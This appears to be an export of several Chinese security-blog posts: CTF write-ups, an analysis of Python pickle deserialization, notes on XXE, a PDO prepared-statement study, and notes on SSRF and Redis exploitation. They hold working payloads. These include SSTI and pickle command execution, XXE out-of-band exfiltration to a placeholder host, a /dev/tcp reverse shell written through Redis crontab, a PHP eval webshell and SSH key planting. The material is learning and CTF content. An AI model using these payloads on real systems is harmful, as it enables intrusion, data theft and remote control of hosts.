//设置stub，增加gif文件头用以欺骗检测$phar-&gt;setMetadata($a); //将自定义meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件$phar-&gt;stopBuffering(); 使用compress.zlib://phar:// 绕过WAF，读取flag。 babyback过滤了单引号，使反斜杠绕过，sleep盲注获得admin密码登录后台。 1username=\\&amp;password=or if((ascii(substr((password),1,1))&lt;120),sleep(2),1)# 后台是一个eval($cmd.’=FALSE’)命令执行 1payload=?&gt;&lt;?=require%0a~%D0%99%93%9E%98?%3E meow world根据提示 ，搜到了一篇文章CAMPCTF，并且找到了pearcmd.php，读取源码 ，发现通过argv参数可以getshell。 由于启动了register_argc_argv ，argv可以直接通过GET传参获取，使用+可以分隔数组。 1payload=/?f=pearcmd&amp;argv=1+list 此命令列出了已安装的pear软件包。 根据文章中所述，可以通过install pear安装包上传shell，按照文章中打包好安装包，并放在自己的服务器下。 1payload=/?f=pearcmd&amp;argv=list+install+--installroot+/tmp/+http://ip+port/upload.tar.gz 成功安装，安装后的路径是由/tmp+pearcmd.php所在路径+doc+安装包内路径组成，通过报错获得pearcmd.php所在路径为： 1/usr/local/lib/php 1payload=/?f=/tmp/usr/local/lib/php/doc/Archive_Tar/Archive/eval 成功getshell,使用蚁剑连接后台，还需要写一个计算题。 1234567891011121314151617use strict;use IPC::Open3;my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, '/readflag' ) or die \"open3() failed $!\";my $r;$r = &lt;CHLD_OUT&gt;;print \"$r\";$r =substr($r,0,11);$r = eval \"$r\";print \"$r\\n\";print CHLD_IN \"$r\\n\";$r = &lt;CHLD_OUT&gt;;print \"$r\";$r = &lt;CHLD_OUT&gt;;print \"$r\"; 成功读取flag。 babyflask一把梭 1234567&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if 'eval' in b.keys() %&#125; &#123;&#123; b['eval']('__import__(\"os\").popen(\"cat /flag\").read()') &#125;&#125; &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 月饼赛web2_故人心第一关科学计数法造成浮点数溢出payload=1e-199。 第二关md2 0e弱比较 单次md2加密：0e652024452 两次md2加密：0e603448399 第三关：要求host必须含有ctfshow.com,使用文件夹路径绕过：a://ctfshow.com/../../../../../fl0g.txt web3_莫负婵娟第一关LIKE注入，发现没有过滤_，于是先用_爆出密码位数，然后一位一位爆破，进入第二关。 第二关命令执行，过滤了所有小写字母，使用环境变量$path构造出nl ????.???读取flag.php。 1$&#123;PATH:14:1&#125;$&#123;PATH:21:1&#125; ????.???","categories":[{"name":"专题  writeup","slug":"专题-writeup","permalink":"http://yoursite.com/categories/专题-writeup/"}],"tags":[]},{"title":"Pickle反序列化","slug":"Pickle反序列化","date":"2020-09-20T16:00:00.000Z","updated":"2020-10-23T13:13:07.896Z","comments":true,"path":"2020/09/21/Pickle反序列化/","link":"","permalink":"http://yoursite.com/2020/09/21/Pickle反序列化/","excerpt":"","text":"Pickle反序列化的分析与利用本文首发于先知https://xz.aliyun.com/t/8342 反序列化过程分析pickle.dump()方法可以将对象序列化。 12345678import pickleclass animal: def __init__(self,animal): self.animal=animal test=pickle.dumps(animal(&quot;dog&quot;))print(test) 1b&apos;\\x80\\x03c__main__\\nanimal\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00animalq\\x03X\\x03\\x00\\x00\\x00dogq\\x04sb.&apos; 使用pickle.loads()方法反序列化字符串，查看一下loads方法的源码。 123456def _loads(s, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\"): if isinstance(s, str): raise TypeError(\"Can't load pickle from unicode string\") file = io.BytesIO(s) return _Unpickler(file, fix_imports=fix_imports, encoding=encoding, errors=errors).load() 跟进_Unpickler类的load方法,重点在下面这一段代码： 在dispatch字典中以opcode=&gt;function的行式存放了许多方法，程序从序列化字符串中读取数据(opcode)，程序通过opcode索引执行对应的方法.。 123456789try: while True: key = read(1) if not key: raise EOFError assert isinstance(key, bytes_types) dispatch[key[0]](self)except _Stop as stopinst: return stopinst.value 拿上面的序列化字符串当作例子,逐步分析整个序列化过程。 第一步：读取到\\x80，通过dispatch字典索引，调用load_proto方法（接下来不再将函数贴出来，推荐自己配合源码阅读） 12345def load_proto(self): proto = self.read(1)[0] if not 0 &lt;= proto &lt;= HIGHEST_PROTOCOL: raise ValueError(\"unsupported pickle protocol: %d\" % proto) self.proto = proto 程序继续读取一个字节，读取到\\x03，它的意思是：这是一个根据三号协议序列化的字符串。 第二部：读取到c (GLOBAL操作码) ，程序往前读取两行字符串，获取域名空间与类名module=__main__,name=animal，调用find_class函数获取到animal对象，并压入栈stack中。 1stack:[&lt;class '__main__.animal'&gt;] 第三步：读取到q（binput操作码），继续读取下一个字节为0，对应的操作为：将stack中栈尾的数据保存到memo字典中的0号位置(可以理解为逐步保存stack中的数据，方便之后调用)。 第四步：读取到)（EMPTY_TUPLE操作码），往栈中压入空的元组。 1stack:[&lt;class '__main__.animal'&gt;,()] 第五步：读取到\\x81（NEW_OBJ），弹出()赋值给args，然后再弹出&lt;class &#39;__main__.animal&#39;&gt;赋值给cls，在这里是animal对象，之后用cls.__new__(cls,*args)实例化该对象并压入栈中，__new__方法的作用是修改不可变类（Int，String等基本类型都是不可变类），在这里我们不需要修改，所以就传入空的元组。 1stack:[&lt;class '__main__.animal'&gt;] 第六步：读取到q\\x01将上面实例化的对象保存到memo[1]中。 第七步：读取到}，往栈中压入空的字典。 1stack:[&lt;class &apos;__main__.animal&apos;&gt;,&#123;&#125;] 第八步：读取到q\\x02将该字典存到memo[2]中。 第九步：读取到X继续向前读取四个字节代表字符串长度，\\x06\\x00\\x00\\x00获得字符串长度为6，接着继续往后读取六个字符animal，存入栈中。 1stack:[&lt;class '__main__.animal'&gt;,&#123;&#125;,animal] 第九步：读取到q\\x03将上面的字符串保存到memo[3]中。 第十步：继续向前提取出dog并保存到memo[4]中。 1stack:[&lt;class &apos;__main__.animal&apos;&gt;,&#123;&#125;,animal,dog] 第十一步：读取到s(SETITEM操作符)，弹出数据作为值，再弹出数据作为健，最后弹出一个数据 (一定要是字典类型) ，以键值对的形式将数据存入该字典中，{‘animal’:’dog’}`,并入栈。 1stack:[&lt;class '__main__.animal'&gt;,&#123;'animal':'dog'&#125;] 第十二步：读取到b(BUILD操作符)，从栈中弹出字典类型的数据赋值给state，弹出&lt;class &#39;__main__.animal&#39;&gt;赋值给inst,如果inst中存在__setstate__方法，则直接用setstate来处理statesetstate(state)，如果不存在，则直接将state存入inst.__dict__中。 第十三步：读取到.，结束反序列化。 反序列化漏洞利用从上面的反序列化过程我们可以看出，python的反序列化过程是完全可控的，接下来介绍几种常用的利用技巧。 全局变量引入在碰到s操作码时，会弹出两个字符串作为键值对保存到字典中，我们可以通过c操作码来得到secret.best，再使animal=secret.best，这样就成功引入了全局变量。 1234567891011import pickleimport secretclass animal: def __init__(self): self.animal=\"dog\" def check(self): if self.animal==secret.best: print(\"good!\")code=\"your code\"pickle.loads(code) 1payload=b'\\x80\\x03c__main__\\nanimal\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00animalq\\x03csecret\\nbest\\nq\\x04sb.' 全局变量修改c操作符是通过调用find_class方法来获取对象，而find_class使用sys.modules[module],name)来获取到相应的属性，sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每导入新的模块，sys.modules会将该模块导入字典中。 在上述代码中，导入了secret模块，所以我们可以通过c操作符获取到secret模块并对secret.best进行重构，再基于此构造animal类。 1payload=b'\\x80\\x03c__main__\\nsecret\\nq\\x00q\\x01&#125;X\\x04\\x00\\x00\\x00bestX\\x03\\x00\\x00\\x00dogsb0c__main__\\nanimal\\n)\\x81&#125;X\\x06\\x00\\x00\\x00animalX\\x03\\x00\\x00\\x00dogsb.' 函数执行与函数执行有关的操作码有r,i,o,b i操作码i操作码的代码如下： 123456def load_inst(self): module = self.readline()[:-1].decode(\"ascii\") name = self.readline()[:-1].decode(\"ascii\") klass = self.find_class(module, name) self._instantiate(klass, self.pop_mark())dispatch[INST[0]] = load_inst 首先通过find_class获得方法，然后通过pop_mark获得参数，并调用_instantiate函数来执行，并将执行的结果存入栈中。 12345def pop_mark(self): items = self.stack self.stack = self.metastack.pop() self.append = self.stack.append return items 相关操作是获取当前栈上的内容，然后将弹出前序栈重新赋值给当前栈，然后返回item作为参数。 所以我们首先用(操作符将当前栈stack中的内容存到前序栈中，通过i操作符获取到os.system并执行whoami指令。 1payload=b'(X\\x06\\x00\\x00\\x00whoamiios\\nsystem\\n.' 成功执行os.system(‘whoami’)。 R操作码R操作码的代码如下。 123456def load_reduce(self): stack = self.stack args = stack.pop() func = stack[-1] stack[-1] = func(*args)dispatch[REDUCE[0]] = load_reduce 分析一下，弹栈作为参数(必须是元组)，将栈中最后一个数据作为函数，并用执行结果将函数覆盖。 所以可以这么构造cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoami\\x85R，\\x85的作用是 将栈中最后一个数据变成元组重新入栈。 1stack:[&lt;built-in function system&gt;,(whoami)] 成功执行os.system(‘whoami’)。 1payload=b'cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoami\\x85R.' o操作码o操作码的代码如下： 123456def load_obj(self): # Stack is ... markobject classobject arg1 arg2 ... args = self.pop_mark() cls = args.pop(0) self._instantiate(cls, args)dispatch[OBJ[0]] = load_obj o操作码将函数与参数弹栈后，直接交给_instantiate执行，并将执行结果存入栈中。 1payload=b'(cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoamio.' b操作码在b操作码执行过程中，如果碰到自定义的__setstate__，就会执行以下代码。 1234setstate = getattr(inst, \"__setstate__\", None)if setstate is not None: setstate(state) return 如果存在__setstate__方法,就直接执行setstate方法，所以可以通过构造__setstate__来进行任意函数执行。 1payload=b'\\x80\\x03c__main__\\nanimal\\n)\\x81&#125;X\\x0C\\x00\\x00\\x00__setstate__cos\\nsystem\\nsbX\\x06\\x00\\x00\\x00whoamib.' 首先BUILE一次animal对象将{&#39;__setstate__&#39;: os.system}字典放入animal类的__dict__字典中，然后用whoami再次进行BUILD，此时state为whoami，由于存在__setstate__方法，所以成功执行os.system(‘whoami’)。 WAF绕过目前主要的漏洞利用都是通过find_class引入os.system等函数函数，所以可以通过重写fine_class添加黑名单等限制，来保护自己的程序。 黑名单绕过构造getattr函数可以使用builtins模块构造getattr函数，不再经过find_class，就能绕过WAF实现任意函数执行。 12R操作码payload=b'\\x80\\x03cbuiltins\\ngetattr\\np0\\ncbuiltins\\ndict\\np1\\nX\\x03\\x00\\x00\\x00get\\x86Rp2\\n0g2\\ncbuiltins\\nglobals\\n)RX\\x0C\\x00\\x00\\x00__builtins__\\x86Rp3\\n0g0\\ng3\\nX\\x04\\x00\\x00\\x00eval\\x86Rp4\\n0g4\\nX\\x21\\x00\\x00\\x00__import__(\"os\").system(\"whoami\")\\x85R.' 1o操作码：payload=b'\\x80\\x03(cbuiltins\\ngetattr\\np0\\ncbuiltins\\ndict\\np1\\nX\\x03\\x00\\x00\\x00getop2\\n0(g2\\n(cbuiltins\\nglobals\\noX\\x0C\\x00\\x00\\x00__builtins__op3\\n(g0\\ng3\\nX\\x04\\x00\\x00\\x00evalop4\\n(g4\\nX\\x21\\x00\\x00\\x00__import__(\"os\").system(\"whoami\")o.' 通过builtins模块构造getattr，获得dict类的get方法，使用get方法取得__builtins__字典中的eval函数，然后使用__import__函数的导入os，成功执行os.system(“whoami”)。 绕过模块名称限制重写sys.modules之前说过find_class使用sys.modules[module],name)来引入模块，但是sys自身也在sys.modules中，所以通过s操作符使sys.modules[‘sys’]=sys.modules，sys模块也就变成了sys.modules模块，然后引入sys.modules中的get方法，取得sys.modules字典中的os模块，再使用s操作符使sys.modules[‘sys’]=os，当前sys模块就变成了os模块，最后成功执行os.system(“whoami”)。 12R操作码payload=b'csys\\nmodules\\np0\\nX\\x03\\x00\\x00\\x00sysg0\\nscsys\\nget\\np1\\ng1\\nX\\x02\\x00\\x00\\x00os\\x85Rp2\\ng0\\nX\\x03\\x00\\x00\\x00sysg2\\nscsys\\nsystem\\nX\\x06\\x00\\x00\\x00whoami\\x85R.' 12o操作码payload=b'csys\\nmodules\\np0\\nX\\x03\\x00\\x00\\x00sysg0\\ns(csys\\nget\\np1\\nX\\x02\\x00\\x00\\x00osop2\\ng0\\nX\\x03\\x00\\x00\\x00sysg2\\ns(csys\\nsystem\\nX\\x06\\x00\\x00\\x00whoamio.' 参考文章 https://xz.aliyun.com/t/7436#toc-11 https://zhuanlan.zhihu.com/p/89132768","categories":[{"name":"专题  Python","slug":"专题-Python","permalink":"http://yoursite.com/categories/专题-Python/"}],"tags":[]},{"title":"XML学习","slug":"XXE专题","date":"2020-06-29T16:00:00.000Z","updated":"2020-11-28T07:21:12.227Z","comments":true,"path":"2020/06/30/XXE专题/","link":"","permalink":"http://yoursite.com/2020/06/30/XXE专题/","excerpt":"","text":"XXE学习记录​ ​ XXE也就是XML外部实体注入，这主要是DTD文件导致的。 DTD简介​ 文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。 DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中： &lt;!DOCTYPE 根元素名 [element-declarations]&gt;，如果DTD位于XML源文件外，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： 123&lt;!DOCTYPE 根元素名称 SYSTEM &quot;filename&quot;&gt;&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt; ​ 这个SYSTEM/PUBLIC关键字就是导致XXE注入的关键，经过研究JAVA解析DTD文件时，通过文件流将SYSTEM关键字后面的值当作URL读取文件，而JAVA文件流支持HTTP、FTP、JAR、FILE等等协议，在PHP中情况也类似，支持PHP伪协议、phar等等协议。 ​ 在DTD中可以定义通用实体和参数实体。 ​ 1、通用实体 ​ 通用实体能在XML文档中引用，示例代码如下： 12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt; ]&gt; &lt;root&gt; &lt;test&gt;&amp;xxe;&lt;/test&gt;&lt;/root&gt; ​ 2、参数实体 ​ 参数实体只能在DTD文件中引用，示例代码如下： test1.dtd 12&lt;!ENTITY % in1 SYSTEM &quot;test2.dtd&quot;&gt;%in1;%out; test2.dtd 1&lt;!ENTITY % out &quot;&lt;!ENTITY writer &apos;111&apos;&gt;&quot; &gt; ​ 关于DTD的基本知识就介绍到这里，接下来尝试一下XXE攻击，本文使用PHP环境。 有回显的XXE首先搭建一个简单的解析XML文档的PHP服务,目标是读取flag.php文件。 12345678&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents('php://input'); $dom = new DOMDocument();//创建文档对象 $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);/指定解析器 $creds = simplexml_import_dom($dom);//将DOM对象转换成XML对象 echo $creds;//输出?&gt; 我们这里主要探讨Data协议 12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM \"data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA=\"&gt; ]&gt; &lt;root&gt;&amp;xxe;&lt;/root&gt; 经过data协议只能获取一些加密的值,并不能直接达到读取文件的效果，但是data协议的加密可以绕过许多关键字过滤，我的初步想法是将data协议读出来的数据拼凑出一个新的实体。 直接拼凑失败了，SYSTEM后面的%xxe;直接被当成url解析了，于是尝试分步拼凑。 发现报错PEReferences forbidden in internal subset in Entity PEReferences 指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体，那就用外部DTD试试。 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY % xxe SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA=&quot;&gt;&lt;!ENTITY % out SYSTEM &quot;file:///C:/phpStudy/PHPTutorial/WWW/out.dtd&quot;&gt;%out;%all; ]&gt; &lt;root&gt;&amp;a;&lt;/root&gt; out.dtd 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY a SYSTEM &apos;%xxe;&apos;&gt;&quot; &gt; 理一下思路，首先在在payload中完成data协议信息读取，然后再外部dtd进行拼凑，最后再引用拼凑的实体进行文件读取，这样可以绕过许多WAF。 顺带一提，当文件中含有&gt;,%,&amp;等字符时，XML解析会报错，不能读取出文件内容，这是可以用CDATA来包裹文件内容，再CDATA中的数据不会被XML解析，也需要用到外部dtd，这里就直接放关键部分payload 1234&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; 无回显XXE关于dtd的引用技巧在上文已经介绍的很清楚了，之前说道SYSTEM/PUBLIC关键字实现原理是XML解析器对后面的url发起一次下载请求，我们可以首先使用nc -lvv port来监听端口，收到请求后就会成功的把文件信息带出，关键payload如下: 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:port?p=%file;&apos;&gt;&quot;&gt; 当然，XXE注入技巧还有许多，本文就先分析到这里，之后再来补充。 本地DTD文件在靶机不通外网的情况下，可以应用本地DTD文件 1ubuntu自带：/usr/share/yelp/dtd/docbookx.dtd 1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % ISOamso &apos; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &apos;&gt; %local_dtd;]&gt; 基于报错的XXE12345678910&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % para &apos; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &apos;&gt; %para;]&gt; 参考文献https://xz.aliyun.com/t/3357#toc-22 https://www.freebuf.com/vuls/207639.html","categories":[{"name":"XXE","slug":"XXE","permalink":"http://yoursite.com/categories/XXE/"}],"tags":[]},{"title":"pdo学习","slug":"PDO学习","date":"2019-10-01T16:00:00.000Z","updated":"2020-10-06T07:14:32.250Z","comments":true,"path":"2019/10/02/PDO学习/","link":"","permalink":"http://yoursite.com/2019/10/02/PDO学习/","excerpt":"","text":"PDO预处理学习前言在代码审计的时候，经常会碰到与pdo有关的sql注入，通过看各种文章，感觉还是弄不懂预处理是如何预防sql注入的，于是就通过抓取流量包的形式，更加深入的了解pdo预处理。 环境配置使用WireShark，选择Adapter for loopback traffic capture网卡即可抓取本地流量包。 深入学习由于并不是所有的数据库驱动都支持预编译模式，所以PDO有模拟预处理功能，就是PDO内部会模逆参数绑定的过程，最后在execute时发送完整的sql语句给数据库执行，PDO的模逆预处理功能是默认打开的，可以通过设置ATTR_EMULATE_PREPARES=false来关闭模逆。 直接上代码演示两种模式 本地预处理123456789&lt;?php$pdo=new PDO(\"mysql:host=localhost;dbname=pdotest\",\"root\",\"root\");$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false)$user=\"lili\";$sql=\"select * from user where username=?\";$st=$pdo-&gt;prepare($sql);$st-&gt;bindParam(1,$user);$st-&gt;execute();?&gt; 抓取流量包 发现在prepare时，会发送一个带有占位符的mysql预处理语句，在execute时，将绑定的参数发送给数据库。 尝试一下sql注入 发送数据时未经过任何处理，但是得不到返回结果，查看mysql查询日志。 看来在mysql本地的预处理，也会将数据转义，那么尝试一下宽字节注入，发现无法得到结果，查看日志 看来当编码设置为GBK时，mysql会将字符串转换成16进制，所以无法注入。 当使用本地预处理时，能使用报错注入，而且只需要执行到prepare就能够将用户名，版本这些信息爆出来，前提是能够控制参数内容。 12345678&lt;?php$pdo=new PDO(&quot;mysql:host=localhost;dbname=pdotest&quot;,&quot;root&quot;,&quot;root&quot;);$user=&quot;lili&quot;;$pdo-&gt;setAttribute(pdo::ATTR_EMULATE_PREPARES, false);$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);$sql=&quot;select * from user where username=(updatexml(0,concat(0xa,user()),0))&quot;;$st=$pdo-&gt;prepare($sql);?&gt; 尝试爆出数据 1$sql=&quot;select * from user where username=(updatexml(0,concat(0xa,(select * from user limit 1)),0))&quot;; 这里非常奇怪，因为需要执行到execute才会在流量包中返回错误，但是PDO并不会报错，去网上搜都说PDO不支持子查询，但我这里确实返回了报错，不解。 模拟预处理12345678&lt;?php$pdo=new PDO(\"mysql:host=localhost;dbname=pdotest\",\"root\",\"root\");$user=\"1' or 1=1 #\";$sql=\"select * from user where username=?\";$st=$pdo-&gt;prepare($sql);$st-&gt;bindParam(1,$user);$st-&gt;execute();?&gt; 抓取流量包 发现字符串被转义了，这是因为使用bindParam时，会进行字符串转义操作，同mysql_real_escape_string。 既然是转义，感觉也能进行宽字节注入。 首先需要设置一下编码 1$pdo-&gt;query('SET NAMES GBK'); 抓包发现成功返回结果，宽字节注入成功。 pdo的mysql语句多行执行也是默认打开的，所以在可以控制参数前提下，能够使用多行来进行注入。 总结总之，只要使用参数绑定，并设置本地预处理优先，基本上就完美防御了sql注入。","categories":[{"name":"pdo","slug":"pdo","permalink":"http://yoursite.com/categories/pdo/"}],"tags":[]},{"title":"SSRF","slug":"协议学习","date":"2019-09-27T16:00:00.000Z","updated":"2020-11-17T13:42:53.402Z","comments":true,"path":"2019/09/28/协议学习/","link":"","permalink":"http://yoursite.com/2019/09/28/协议学习/","excerpt":"","text":"SSRF学习URL结构url为统一资源定位符。 url标准格式如下： 1[协议类型]://[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID url完整格式如下： 1[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID] 协议类型：一般含有http,https,file,ftp,gopher,wais,news,telent 凭证信息：username:password，以@结尾 Redis漏洞利用在介绍漏洞利用之前，首先了解一下Redis的数据传输协议。 Redis数据传输协议Redis使用RESP序列化协议将传输的数据分为以下五种最小单元类型，单元结束时加上\\r\\n换行符： 单行回复：回复的第一个字节是 “+” 错误信息：回复的第一个字节是 “-“ 整形数字：回复的第一个字节是 “:” 多行字符串：回复的第一个字节是 “$” 数组：回复的第一个字节是 “*” 任意文件写入由于Redis的备份功能可以任意指定目录，这就造成了任意文件写入漏洞，主要有反弹shell、写WebShell、写ssh公钥这几种攻击方式。 弹shell利用方式首先讲一下Linux的定时任务，在Linux中corntab命令用于设置周期性被执行的任务，crontab命令从标准输入设备读取指令，并存放于crontab文件中，以供之后的读取和执行。 crontab命令读取目录 12/var/spool/cron//etc/crontab crontab文件格式如下 1234567minute hour day month week command操作符有* 取值范围内所有数字/ 每隔多久执行一次x-z 从x-zx，z 每x和z执行一次* * * * * 代表每分钟执行一次 我们利用Redis的备份功能，在crontab读取命令的目录中，写入shell，即可执行shell命令。 1234set x \"* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"config set dir /var/spool/cron/config set dbfilename rootsave 利用条件 弹shell要求Redis在root用户下运行 由于Redis备份的是Redis格式的数据，所以会包含许多乱码，在Ubuntu下不能执行（Centos会自动忽略错误信息）。 写入WebShell1234set x &quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot;config set dir /Web目录config set dbfilename &quot;shell.php&quot;save 利用条件 Web目录写入权限 写入ssh公钥12345678本地生成密钥对ssh-keygen -t rsa##将公钥写入服务器/root/.ssh文件夹中set x &quot;公钥&quot;config set dir /root/.sshconfig set dbfilename &quot;authorized_keys&quot;save 攻击者执行 1ssh -i 私钥 root@ip 利用条件 root权限 主从复制RCE虽然redis读取写入的速度很快，当大量的访问数据库的时候，为了分担压力，Redi支持主从复制功能，也就是读写分离，节点复制主节点全部数据(数据复制只能由主节点复制到从节点)，由主节点提供写服务，从节点提供读服务，可大大提高Redis服务器的并发量。 漏洞利用原理可扩展module为了使Redis的使用更加的灵活，Redus4.0以上版本支持了可扩展的module，并给出了API文件和官方示例。 用户只需按照API编写自己的module，并使用module load module.so命令加载模组，即可往Redis服务器中添加自己的命令，非常的方便，但是也能自定义函数完成RCE。 这里使用github上大佬的EXPRedis-rouge-server，该EXP编写了一个system.exec命令，加载module后能直接进行RCE。 但是这只是在自己的Redis服务器上实现了RCE，如何将他传入其他的Redis服务器呢？主从复制是不会将module也复制给从节点的，这就需要用到下面的主从复制全量同步。 主从复制的全量同步master服务器会开启一个后台进程用于将redis中的数据生成一个rdb文件，与此同时，服务器会缓存所有接收到的来自客户端的写命令（包含增、删、改），当后台保存进程处理完毕后，会将该rdb文件传递给slave服务器，而slave服务器会将rdb文件保存在磁盘并通过读取该文件将数据加载到内存，在此之后master服务器会将在此期间缓存的命令通过redis传输协议发送给slave服务器，然后slave服务器将这些命令依次作用于自己本地的数据集上最终达到数据的一致性。 这里有一篇博文，想深入了解主从复制可以看看https://www.cnblogs.com/kismetv/p/9236731.html&gt; 通过上面的两点可以知道当进行主从复制的全量同步时，会传输一个文件给slave服务器，所以我们可以利用这点，通过Python伪造一个恶意Redis服务器恶意Redis服务器伪造，当收到服务器的slave请求时，模拟全量同步的过程，将我们的exp.so发送到slave服务器中，在slave服务器执行module load exp.so即可实现RCE。 漏洞复现一台Redis服务器 1docker pull shuogesha/redis5.0.5 伪造恶意Redis服务器 1https://github.com/LoRexxar/redis-rogue-server exp 1https://github.com/n0b0dyCN/RedisModules-ExecuteCommand 启动Reids的docker，将exp.so与伪造的Redis服务器放入同一文件夹 执行命令 1python3 redis-rogue-server.py --rhost 目标IP --rport 目标端口 --lhost 攻击机IP 注意：攻击机与目标机必须能够互相访问。 现在恶意module已经被目标及加载，连接上即可执行命令。 恶意module加载RCE主从复制RCE要求攻击机与目标机必须能够互相访问，但如果靶机不能访问外网主从复制就打不通，那能不能利用备份功能写入恶意module呢，答案是不能，之前说过，备份存入的文件是以Redis的特殊结构保存，在ELF文件看来就是乱码，因为ELF文件对格式要求严格，所以不能执行。 所以只能配合Web页面的文件上传，上传恶意module，然后再加载module实现RCE。 gopher协议gopher协议格式： 1gopher://ip:port/连接符+TCP/IP数据 gopher会将连接符后面的数据发送给相应的端口，可以是字符串也可以是其他格式的请求包，比如GET,POST,redis,mysql未授权访问，将数据使用url编码，gopher才能正常解析。 dict协议dict协议格式: 12dict://ip:port/命令:参数:参数dict://ip:port/命令 参数 参数 dict协议是词典网络协议，可以连接字典服务器（比如Redis），不过只支持没有密码的Redis，因为dict只能逐行命令执行，每执行一行后，都会QUIT断开连接，所以无法保存身份认证信息。 SSRF+Redis利用途径gopher发送Redis数据包首先需要知道Redis数据包的格式，gopher才能正确解析。 使用socat端口转发获取Redis流量： 1socat -v tcp-listen:2333,fork tcp-connect:127.0.0.1:6379 将来自2333端口的流量转发至6379端口(也就是Redis服务器端口)，-v参数能够显示转发的流量。 使用redis-cli连接2333端口 1./redis-cli -h 127.0.0.1 -p 2333 执行set x 1命令可以看到转发的流量为，这是经过RESP协议序列化后的数据 1234567*3\\r$3\\rset\\r$1\\rx\\r$1\\r1\\r 所以我们只需要将payload转换成如上形式，然后url编码，使用gopher发送即可，前人栽树，后人乘凉，github上有许多生成payload脚本https://github.com/xmsec/redis-ssrf (如果是get方式传参，需要进行二次编码) dict逐行执行命令首先尝试直接发送payload 1dict://ip:port/set:x:&quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot; 报错，抓取一下流量发现在?处被截断。 16进制编码绕过截断对于&lt;?这样的非法字符，需要用16进制编码，正常发送。 1set x &quot;\\x3C\\x3Fphp\\x20eval($_POST[&apos;aa&apos;])\\x3B\\x3F\\x3E&quot; 成功写入 123set x &quot;\\x3C\\x3Fphp\\x20eval($_POST[&apos;aa&apos;])\\x3B\\x3F\\x3E&quot;config set dir /var/www/htmlconfig set dbfilename &quot;shell.php&quot; bitop命令绕过截断Bitop命令为Redis位操作，BITOP命令支持四个位运算：AND，OR，XOR 和NOT 1234BITOP AND destkey key [key ...] ，对一个或多个key求逻辑并，并将结果保存到destkeyBITOP OR destkey key [key ...] ，对一个或多个key求逻辑或，并将结果保存到destkeyBITOP XOR destkey key [key ...] 